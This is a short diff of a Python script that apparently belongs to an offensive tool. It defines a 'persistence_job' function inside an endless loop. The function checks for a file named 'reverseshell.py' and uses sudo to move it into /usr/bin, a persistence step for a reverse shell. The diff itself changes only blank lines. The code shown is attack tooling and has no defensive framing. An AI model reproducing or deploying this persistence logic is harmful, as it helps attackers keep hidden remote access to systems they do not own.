@@ -5,12 +5,10 @@ import os
 while True:
 
     def persistence_job():
-        
         import platform
         import time
-
         os.system('clear')
-
+        
         FILE_CHECK = os.path.exists("reverseshell.py")
         if FILE_CHECK == True:   
             os.system('sudo mv reverseshell.py /usr/bin')
